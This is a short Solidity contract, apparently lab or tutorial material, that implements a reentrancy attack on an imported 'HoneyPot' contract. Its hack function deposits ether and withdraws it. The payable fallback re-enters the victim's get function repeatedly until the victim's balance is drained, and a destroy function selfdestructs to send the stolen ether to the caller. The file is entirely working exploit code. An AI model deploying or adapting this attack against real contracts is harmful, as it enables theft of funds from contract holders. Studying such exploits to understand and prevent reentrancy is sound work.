pragma solidity 0.4.24;

import "./Victim.sol";

contract HackVictim {
    
  HoneyPot victim;
  
  function HackVictim (address _address) {
    victim = HoneyPot(_address);
  }

  function () payable {
    if (victim.balance > 0) {
      // This function is invoked by the victim. As long 
      // there is balance get it from the victim
      victim.get();
    }
  }
  
  function hack() payable {
    // Send some ether to the victim
    victim.put.value(msg.value)();
    victim.get();
  }
  
  function destroy() {
    selfdestruct(msg.sender);
  }

}